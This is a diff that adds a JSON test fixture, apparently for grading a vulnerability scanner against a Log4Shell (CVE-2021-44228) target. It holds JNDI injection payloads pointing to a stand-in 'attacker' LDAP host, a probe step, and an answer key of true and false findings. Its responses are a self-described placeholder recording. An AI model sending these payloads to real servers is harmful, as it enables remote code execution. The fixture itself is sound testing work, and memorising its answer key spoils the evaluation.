@@ -1,0 +1,30 @@
+{
+  "name": "vulhub-log4shell",
+  "label_source": "vulhub:CVE-2021-44228 (seed recording — replace with real mitmproxy/VCR capture)",
+  "target": {"host": "172.20.0.5", "port": 8080},
+  "exposure": {"reachability": "public", "waf": null},
+  "interactions": [
+    {"request": {"method": "GET", "path": "/", "headers": {}, "body": ""},
+     "response": {"status": 200,
+                  "headers": {"Server": "Apache-Coyote/1.1", "Content-Type": "text/html"},
+                  "body": "<html><head><title>Apache Tomcat/9.0.30</title></head><body>HTTP Status 404 - login</body></html>"}},
+    {"request": {"method": "POST", "path": "/api/search",
+                 "headers": {"X-Api-Version": "${jndi:ldap://attacker/x}"},
+                 "body": "q=${jndi:ldap://attacker/a}"},
+     "response": {"status": 500,
+                  "headers": {"Content-Type": "text/plain"},
+                  "body": "ERROR JNDI_LOOKUP_TRIGGERED: outbound LDAP to attacker resolved; class loaded"}}
+  ],
+  "probes": [
+    {"claim": "CVE-2021-44228", "cvss": 10.0, "kev": true, "exploit_available": true, "severity": "critical",
+     "steps": [
+       {"method": "POST", "path": "/api/search", "body": "q=${jndi:ldap://attacker/a}",
+        "success": "JNDI_LOOKUP_TRIGGERED"}
+     ]}
+  ],
+  "truth": [
+    {"port": 8080, "claim": "CVE-2021-44228", "is_real": true,  "severity": "critical"},
+    {"port": 8080, "claim": "apache",         "is_real": false, "severity": "low"},
+    {"port": 8080, "claim": "apache tomcat",  "is_real": false, "severity": "low"}
+  ]
+}
